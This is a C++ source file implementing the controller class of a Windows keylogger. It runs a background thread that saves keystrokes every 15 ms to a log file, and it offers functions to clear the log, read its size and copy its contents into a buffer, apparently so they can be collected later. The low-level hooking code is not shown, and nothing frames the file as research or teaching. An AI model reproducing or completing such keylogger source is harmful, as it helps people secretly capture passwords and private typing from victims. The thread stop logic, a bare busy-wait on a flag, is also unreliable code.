#include "methods/keylogger/Keylogger.h"

#include <windows.h>

#ifdef _DEBUG
#include <iostream>
#endif // _DEBUG

#include <string>
#include <thread>
#include <cstdio>
#include <fstream>
#include <algorithm>


using namespace methods::keylogger;

Keylogger::~Keylogger()
{
    StopThread();
}

void
Keylogger::StartThread()
noexcept
{
    if ( true == m_threadRunning )
        return;

    m_threadRunning = true;

    std::thread(&Keylogger::KeylogThread, this) .detach();
}

void
Keylogger::StopThread()
noexcept
{
    if ( false == m_threadRunning )
        return;

    m_threadRunning = false;

    while ( false == m_threadOut )
        ; // wait for thread to terminate
}

void
Keylogger::ClearLog()
noexcept
{
    if ( m_threadRunning )
    {
        StopThread();

        m_implementation->RestartLog();

        StartThread();
    }
    else
    {
        m_implementation->RestartLog();
    }
}

uint32_t
Keylogger::LogSize()
noexcept
{
    const char *file_name = m_implementation->GetFileNameC();

    std::ifstream file( file_name, std::ios::binary | std::ios::ate);
    return file.tellg();
}

uint32_t
Keylogger::GetLog(
    char *buffer,
    uint32_t buffer_len)
noexcept
{
    uint32_t read_len = std::min(buffer_len, LogSize());

    std::ifstream file( m_implementation->GetFileNameS() , std::ios::binary);

    file.read(buffer, read_len);

    return ( file.gcount() );
}

/* private */

void
Keylogger::KeylogThread()
noexcept
{
    m_threadOut = false;

    while ( true == m_threadRunning )
    {
        m_implementation->KeystrokeSavingRoutine();

        Sleep(15);
    }

    m_threadOut = true;
}
